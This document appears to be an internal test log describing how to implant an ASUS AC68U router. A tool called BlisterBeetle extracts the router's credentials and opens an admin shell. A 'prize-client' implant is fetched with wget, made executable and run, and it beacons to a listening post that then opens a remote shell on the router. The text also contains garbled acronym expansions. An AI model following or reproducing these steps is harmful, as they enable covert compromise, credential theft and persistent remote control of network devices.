JQJPRIZE - ASUS AC68U
Setup / Test ASUSComputer manufacturer AC68U with ARM5 configured Cannoli 2.0 using BlisterBettle (1/30 - 1/31/16)

Connect ASUSComputer manufacturer AC68U WANWide Area Network side to VLANVirtual Local Area Network 610 for Cannoli WANWide Area Network (DHCPDynamic Host Configuration Protocol)
Connect ASUSComputer manufacturer AC68U LANLocal Area Network side to VLANVirtual Local Area Network 611 for Cannoli LANLocal Area Network side (DHCPDynamic Host Configuration Protocol from DUTDevice Under Test 192.168.1.0/24)Cannoli-lan-1 VMVirtual Machine should obtain a 192.168.1.0/24 IP address from the AC68U


On Cannoli LP:
Unzipped Cannoli 2.0 zip in: /home/ndb/prize2/
In /bin/ folder, copied the .cfg example file and make a prize-config.cfg file with the LPListening Post IP as the #1 LPListening Post (172.20.13.50)
Run the following command to create client & server files: ./CCT ../bin/arm5-32-LE-static/client/client prize-client ../bin/arm5-32-LE-static/server/server prize-server prize-config.cfg




On LANLocal Area Network VM
Put BlisterBeetle installer script on LANLocal Area Network VMVirtual Machine in /home/ndb/prize
Also scp'd "prize-client" to the same folder above
Installed BlisterBeetle library files from #/home/ndb/prize/BlisterBeetle_v1.0/BIN/Unclassified/Dependancies/Go to each folder and run "python setup.py install" to install all the BlisterBeetle dependancies

From /home/ndbprize/BlisterBeetle_v1.0/BIN/Unclassified#
Run: python blister_beetle.pyBlisterBeetle returns target model, default IP of 192.168.1.1, Firmware version, creds

Run: python blister_beetle.py -shell
BlisterBeetle drops you to an admin shell on the AC68U
cd to /tmp directory on AC68U


With the LANLocal Area Network side computer setup with HTTP/FTP access and the prize-client file on the FTPFile Transfer Protocol root folder (/var/ftp), run the following command to upload the prize-client file to the AC68Uwget ftp://192.168.1.4/prize-client

Once prize-client has uploaded, change the permissions#chmod 755 prize-client

With LPListening Post listening (directions below) start the prize-client on the AC68U/tmp# ./prize-client -b &






From Cannoli LP:

With the "./prize-server 9000" already running on the LP... implant beacons back with it's source IP of 172.20.100.254
Beacon was originally set to beacon every 60 seconds
Modify shell.sh example script to set taget_mac to WANWide Area Network mac address (Impant ID) of ASUS
Issued "./shell.sh" command after this to get a shell once the target beacons back again.
type "ls" at new shell prompt and the file system on target is seen
native shell commands are available
